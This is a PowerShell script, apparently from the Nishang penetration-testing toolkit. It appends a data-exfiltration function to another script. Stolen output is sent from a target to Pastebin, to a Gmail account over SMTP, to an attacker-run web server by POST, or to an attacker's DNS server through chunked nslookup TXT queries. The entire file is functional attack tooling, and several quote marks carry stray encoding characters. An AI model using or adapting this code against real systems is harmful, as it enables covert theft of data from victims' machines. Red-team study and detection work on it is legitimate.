

function Add-Exfiltration
{
<#
.SYNOPSIS
Use this script to exfiltrate data from a target.

.DESCRIPTION
This script can be used to exfiltrate data from a target to Gmail, Pastebin, a web server which can log POST requests,
or a DNS server which can log TXT queries. To decode the data exfiltrated by the web server and DNS methods, use Invoke-Decode.ps1 
in the utility folder of Nishang.

.PARAMETER ScriptPath
The path to the script to which exfiltration is to be added.

.PARAMETER FilePath
The path to the output script with added exfiltration.

.PARAMETER ExfilOption
The method you want to use for exfitration of data. Valid options are "gmail", "pastebin", "WebServer", or "DNS".

.PARAMETER dev_key
The unique API key provided by Pastebin when you register for a free account.
Unused for other options,

.PARAMETER username
Username for the Pastebin or Gmail account where data would be exfiltrated.
Unused for other options.

.PARAMETER password
Password for the Pastebin or Gmail account where data would be exfiltrated.
Unused for other options.

.PARAMETER URL
The URL of the web server where POST requests would be sent. The web server must be able to log the POST requests.
The encoded values from the web server can be decoded by using Invoke-Decode from Nishang.

.PARAMETER DomainName
The domain name, whose subdomains should be sent TXT queries. The DNS Server must log the TXT queries.

.PARAMETER AuthNS
Authoritative name server for the domain specified in "DomainName." Using it may increase the chance of detection.
Usually, you should let the name of target to resolve things for you.

.EXAMPLE
PS > Add-Exfiltration -ScriptPath C:\Get-Information.ps1 -FilePath C:\test\Get-Information_exfil.ps1

PS > . .\Get-Information_exfil.ps1

PS > Get-Information | Do-Exfiltration -ExfilOption webserver -URL http://yourwebserver.com

The first command adds exfiltration to Get-Information.ps1 and writes it to Get-Information_exfil.ps1

The second command loads the generated Get-Information_exfil.ps1

The third command runs the Get-Information function and pipes its output to the Do-Exfiltration function.

See the help of Do-Exfiltraion.ps1 to understand various options for exfiltration.

.LINK
http://labofapenetrationtester.com/
https://github.com/samratashok/nishang
#>
    [CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory = $True)] 
        [String]
        $ScriptPath,

        [Parameter(Position = 1, Mandatory = $True)] 
        [String]
        $FilePath
    )

    $Exfiltration = @'
        function Do-Exfiltration
        {
            [CmdletBinding()] Param(
        
                [Parameter(Position = 0, Mandatory = $True, ValueFromPipeLine = $True)] 
                [String]
                $Data,
        
                [Parameter(Position = 1, Mandatory = $True)] [ValidateSet("gmail","pastebin","WebServer","DNS")]
                [String]
                $ExfilOption,

                [Parameter(Position = 2, Mandatory = $False)] 
                [String]
                $dev_key,

                [Parameter(Position = 3, Mandatory = $False)]
                [String]
                $username,

                [Parameter(Position = 4, Mandatory = $False)]
                [String]
                $password,

                [Parameter(Position = 5, Mandatory = $False)]
                [String]
                $URL,
      
                [Parameter(Position = 6, Mandatory = $False)]
                [String]
                $DomainName,

                [Parameter(Position = 7, Mandatory = $False)]
                [String]
                $AuthNS
            )

            function post_http($url,$parameters) 
            { 
                $http_request = New-Object -ComObject Msxml2.XMLHTTP 
                $http_request.open("POST", $url, $false) 
                $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
                $http_request.setRequestHeader("Content-length", $parameters.length); 
                $http_request.setRequestHeader("Connection", "close") 
                $http_request.send($parameters) 
                $script:session_key=$http_request.responseText 
            } 

            function Compress-Encode
            {
                #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
                $ms = New-Object IO.MemoryStream
                $action = [IO.Compression.CompressionMode]::Compress
                $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
                $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
                $pastevalue | ForEach-Object {$sw.WriteLine($_)}
                $sw.Close()
                # Base64 encode stream
                $code = [Convert]::ToBase64String($ms.ToArray())
                return $code
            }

            if ($exfiloption -eq "pastebin")
            {
                $utfbytes  = [System.Text.Encoding]::UTF8.GetBytes($Data)
                $pastevalue = [System.Convert]::ToBase64String($utfbytes)
                $pastename = "Exfiltrated Data"
                post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
                post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pastename&api_paste_code=$pastevalue&api_paste_private=2" 
            }
        
            elseif ($exfiloption -eq "gmail")
            {
                #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
                $smtpserver = "smtp.gmail.com"ù
                $msg = new-object Net.Mail.MailMessage
                $smtp = new-object Net.Mail.SmtpClient($smtpServer )
                $smtp.EnableSsl = $True
                $smtp.Credentials = New-Object System.Net.NetworkCredential("$username"ù, "$password"ù); 
                $msg.From = "$username@gmail.com"ù
                $msg.To.Add("ù$username@gmail.com"ù)
                $msg.Subject = "Exfiltrated Data"
                $msg.Body = $Data
                if ($filename)
                {
                    $att = new-object Net.Mail.Attachment($filename)
                    $msg.Attachments.Add($att)
                }
                $smtp.Send($msg)
            }

            elseif ($exfiloption -eq "webserver")
            {
                $Data = Compress-Encode    
                post_http $URL $Data
            }
            elseif ($ExfilOption -eq "DNS")
            {
                $code = Compress-Encode
                $queries = [int]($code.Length/63)
                while ($queries -ne 0)
                {
                    $querystring = $code.Substring($lengthofsubstr,63)
                    Invoke-Expression "nslookup -querytype=txt $querystring.$DomainName $AuthNS"
                    $lengthofsubstr += 63
                    $queries -= 1
                }
                $mod = $code.Length%63
                $query = $code.Substring($code.Length - $mod, $mod)
                Invoke-Expression "nslookup -querytype=txt $query.$DomainName $AuthNS"

            }

        }
'@
    $ScriptContent = Get-Content $ScriptPath
    Out-File -InputObject $ScriptContent -FilePath "$Filepath"
    Out-File -InputObject $Exfiltration -Append  -FilePath "$Filepath"
}


